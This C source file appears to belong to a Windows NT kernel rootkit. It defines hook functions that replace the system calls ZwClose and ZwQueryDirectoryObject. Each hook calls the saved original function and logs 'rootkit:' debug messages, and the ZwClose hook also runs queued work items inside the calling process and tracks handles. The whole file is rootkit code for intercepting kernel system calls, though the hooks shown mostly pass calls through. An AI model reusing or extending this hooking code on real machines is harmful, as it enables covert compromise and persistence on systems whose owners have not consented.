
#include "rk_driver.h"
#include "rk_object.h"
#include "rk_defense.h"
#include "rk_exec.h"
#include "rk_utility.h"

/* NT object manager */

/* ______________________________________________________________________________
 . Perhaps the most frequently called function under NT. ;-)
 . ______________________________________________________________________________ */
NTSTATUS NewZwClose(
	HANDLE Handle
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];

		DequeuAndRun_RunInProcessContext_WorkItem();	
		
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwClose() from %s\n", aProcessName);

        rc=((ZWCLOSE)(OldZwClose)) (
			Handle
			);
		DbgPrint("rootkit: ZwClose : rc = %x\n", rc);

#if 1		
		if(rc == STATUS_SUCCESS)
		{
			__try
			{
				FreeTrackHandle( Handle );
			}
			__except(EXCEPTION_EXECUTE_HANDLER)
			{
				DbgPrint("rootkit: exception while freeing handle tracker\n");
			}
		}
#endif

		return rc;
}

/* ______________________________________________________________________________
 . 
 . ______________________________________________________________________________ */
NTSTATUS NewZwQueryDirectoryObject(
	HANDLE hDirectory,
	PQUERYDIRECTORYOBJECTBUFFER DirectoryEntryBuffer,
	ULONG DirectoryEntryBufferSize,
	BOOLEAN  bOnlyFirstEntry,
	BOOLEAN bFirstEntry,
	PULONG  BytesReturned,
	PULONG  EntryIndex
)
{
        int rc;
		CHAR aProcessName[PROCNAMELEN];
		
		GetProcessName( aProcessName );
		DbgPrint("rootkit: NewZwQueryDirectoryObject() from %s\n", aProcessName);

        rc=((ZWQUERYDIRECTORYOBJECT)(OldZwQueryDirectoryObject)) (
			hDirectory,
			DirectoryEntryBuffer,
			DirectoryEntryBufferSize,
			bOnlyFirstEntry,
			bFirstEntry,
			BytesReturned,
			EntryIndex );
		DbgPrint("rootkit: ZwQueryDirectoryObject : rc = %x\n", rc);
        return rc;
}


